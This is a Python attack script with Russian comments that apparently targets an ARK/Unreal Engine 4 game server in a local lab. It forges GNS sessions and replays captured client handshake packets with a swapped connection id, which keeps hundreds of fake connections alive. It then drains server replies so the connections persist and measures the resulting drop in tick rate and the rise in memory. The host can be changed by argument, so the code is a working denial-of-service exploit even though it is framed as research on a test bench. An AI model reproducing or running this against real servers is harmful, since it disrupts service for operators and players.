# -*- coding: utf-8 -*-
"""
ark_lab_gns_persist_dos.py — доработанный вектор: постоянные поддельные соединения.

Идея: подделать GNS-сессию (3 пакета) и «доиграть» UE4-хендшейк копией пакетов
настоящего клиента (4 пакета, подменяется только to_connection_id) - тогда
соединение на сервере ОСТАЁТСЯ ЖИВЫМ (проверено: liveConnections растёт) и
сервер продолжает слать нам данные.

В отличие от «волны» пакетов (DoS на время атаки) здесь стоимость переносится
на сервер: N постоянных соединений = N объектов в списке NetDriver, по которым
сервер итерирует в каждом тике, пока не истечёт таймаут (300 с).

На каждое соединение атакующий тратит ~7 пакетов и может перестать слать.

Измеряет: FPS/TPS плагина, tickMs, память, живые соединения.

Только локальный стенд 192.168.8.218.
"""
from __future__ import annotations

import argparse
import io
import json
import os
import socket
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
from ark_lab_metrics import NetGuardClient  # noqa: E402
from ark_lab_gns_amp import forge_session  # noqa: E402

CAPTURE = r"C:\Dev\_research\security\out\gns_relay_capture.jsonl"


def client_data_packets(limit: int = 4) -> list[bytes]:
    recs = [json.loads(l) for l in io.open(CAPTURE, encoding="utf-8") if l.strip()]
    out = []
    for r in recs:
        if r["dir"] == "c2s" and r["lead"] in (0x80, 0x81):
            out.append(bytes.fromhex(r["hex"]))
            if len(out) >= limit:
                break
    return out


def open_persistent_session(host: str, game_port: int, pkts: list[bytes],
                            sock: socket.socket) -> int | None:
    """Одна постоянная поддельная сессия. Возвращает server_connection_id."""
    sock.setblocking(True)          # рукопожатие требует блокирующего recvfrom
    sock.settimeout(2.0)
    try:
        srv = forge_session(host, game_port, sock, verbose=False)
    except Exception:  # noqa: BLE001
        return None
    sock.setblocking(False)         # дальше только отправка
    for raw in pkts:
        body = bytearray(raw)
        struct.pack_into("<I", body, 1, srv & 0xFFFFFFFF)
        try:
            sock.sendto(bytes(body), (host, game_port))
        except OSError:
            pass
        time.sleep(0.01)
    return srv


def drain_all(socks: list[socket.socket]) -> int:
    """Читает ответы сервера во всех сокетах.

    Это критично: если сокет не читать, его буфер приёмки переполняется,
    отправка сервера блокируется, и он рвёт соединение по таймауту.
    """
    n = 0
    for sk in socks:
        while True:
            try:
                sk.recvfrom(65535)
                n += 1
            except (BlockingIOError, OSError):
                break
    return n


def main() -> int:
    ap = argparse.ArgumentParser(description="Постоянные поддельные соединения -> DoS на FPS")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--count", type=int, default=200, help="сколько постоянных соединений открыть")
    ap.add_argument("--step", type=int, default=50, help="шаг отчёта")
    ap.add_argument("--watch", type=float, default=20.0, help="сколько секунд наблюдать после создания")
    ap.add_argument("--keep", action="store_true", help="не закрывать сокеты (держать соединения)")
    args = ap.parse_args()

    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()
    pkts = client_data_packets(4)
    st0 = m.status()
    print("до : live=%s total=%s attempts=%s tps=%s tickMs=%s memKB=%s" % (
        st0.get("liveConnections"), st0.get("totalConnections"), st0.get("connectionAttempts"),
        st0.get("tps"), st0.get("tickMs"), st0.get("memKB")))

    socks = []
    t0 = time.time()
    made = 0
    for i in range(args.count):
        sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sk.settimeout(2.0)
        sk.bind(("0.0.0.0", 0))
        sk.setblocking(False)
        if open_persistent_session(args.host, args.game_port, pkts, sk) is not None:
            made += 1
        socks.append(sk)
        if (i + 1) % args.step == 0:
            st = m.status()
            print("  соединений создано %4d (%.1f с)  live=%-5s attempts=%-9s tps=%-6s tickMs=%-6s memKB=%s" % (
                made, time.time() - t0, st.get("liveConnections"), st.get("connectionAttempts"),
                st.get("tps"), st.get("tickMs"), st.get("memKB")))
        time.sleep(0.01)

    print("  всего соединений: %d за %.1f с" % (made, time.time() - t0))
    t1 = time.time()
    got = 0
    while time.time() - t1 < args.watch:
        got += drain_all(socks)          # дренируем ответы сервера - иначе он рвёт сессии
        st = m.status()
        print("  t=%5.1f с  live=%-5s total=%-5s tps=%-6s tickMs=%-6s memKB=%-9s ответов=%d" % (
            time.time() - t1, st.get("liveConnections"), st.get("totalConnections"),
            st.get("tps"), st.get("tickMs"), st.get("memKB"), got))
        time.sleep(2.0)

    st1 = m.status()
    print("итог: live=%s total=%s tps=%s tickMs=%s memKB=%s (было %s) attempts +%s" % (
        st1.get("liveConnections"), st1.get("totalConnections"), st1.get("tps"),
        st1.get("tickMs"), st1.get("memKB"), st0.get("memKB"),
        (st1.get("connectionAttempts") or 0) - (st0.get("connectionAttempts") or 0)))
    if not args.keep:
        for sk in socks:
            sk.close()
        print("сокеты закрыты (серверные соединения останутся до таймаута)")
    m.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
